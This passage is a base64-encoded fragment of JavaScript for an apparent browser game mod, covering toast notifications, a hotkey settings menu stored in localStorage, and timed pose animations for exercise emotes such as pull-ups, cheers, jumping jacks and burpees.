uZENoYXQgPSBORVd0YWxraW5nOwogICAgfQogIH0KCiAgZnVuY3Rpb24gcnVuT3B0aW9uMygpIHsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RzY3BnKCkgewogICAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgICAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICAKICAgIC8vIFN0YXR1cyBiYXIgd2lkdGggd2hpbGUgY291bnRpbmcgZG93bgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgfSwgMCk7CiAgICB2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIGljb24uc3R5bGUud2lkdGggPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CiAgICBpY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKICAgIGljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkFjdGlvbiBTdWNjZXNzZnVsbHkgRXhlY3V0ZWQiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgICAgICB9LCAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgfSwgNTAwMCk7CiAgICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIH0sIDU1MDApOwogICAgICAgIHNlbmRGZGVidWcoKTsKICAgIAogICAgICB9CgogICAgfQogIH0KCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24xIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94MS5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0KICAKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjIiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gyLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfQoKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMywgMTAwMCk7CiAgICB9CiAgfQogIAogIGNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0pOwogIAogIGNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjIsIDEwMDApOwogICAgfQogIH0pOwoKICBjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9KTsKICAKCi8vT3B0aW9ucyBTdGF0ZXNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMiIsIGNoZWNrYm94Mi5jaGVja2VkKTsKfSk7CgpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjMiLCBjaGVja2JveDMuY2hlY2tlZCk7Cn0pOwoKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2V0dGluZ3NNZW51KTsKCmxldCBpc0JhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgaXNTUHJlc3NlZCA9IGZhbHNlOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBpc0JhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IHRydWU7CiAgfQoKICBpZiAoaXNCYWNrdGlja1ByZXNzZWQgJiYgaXNTUHJlc3NlZCkgewogICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH0KfSk7CgovLyBIaWRlIHNldHRpbmdzIG1lbnUgd2hlbiB1c2VyIGNsaWNrcyBvZmYKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogICAgY29uc3QgdGFyZ2V0RWxlbWVudCA9IGV2ZW50LnRhcmdldDsKICAgIGNvbnN0IGlzU2V0dGluZ3NNZW51ID0gISF0YXJnZXRFbGVtZW50LmNsb3Nlc3QoIiNzZXR0aW5ncy1tZW51Iik7CiAgICAKICAgIGlmICghaXNTZXR0aW5nc01lbnUpIHsKICAgICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CiAgfSk7CiAgCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgaXNCYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gInMiKSB7CiAgICBpc1NQcmVzc2VkID0gZmFsc2U7CiAgfQp9KTsKCgovL0VuZCBvZiBQZXJzaXN0YW50IE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgovL1N0YXJ0IG9mIEVtb3RlIE1lbnUgX19fX19fX19fX19fX19fX19fX19fCgpjb25zdCBidXR0b25EYXRhID0gWwogIHsgbmFtZTogIlB1bGwtVXBzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDEwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAyNTAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAyMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewoKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDMwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAyNTAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA0MDAwKTsgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgICBIZWlnaHQ6IDEzMAogICAgICAgICAgICB9OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDUwMDApOwogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgICAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogICAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICAgIH0sIDYwMDApOyAgICAKfSB9LAogIHsgbmFtZTogIkNoZWVyIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgCiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDUwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA2MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNzAwMCk7IH0gfSwKICB7IG5hbWU6ICJKdW1waW5nIEphY2tzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgSGVpZ2h0OiAxNTAKICAgICAgICAgIH07CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB1bmRlZmluZWQ7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NDbG9zZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICBIZWlnaHQ6IDE1MAogICAgICAgICAgfTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKQogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgICB9IH0sCiAgeyBuYW1lOiAiQnVycGVlcyIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDEwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA1MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWV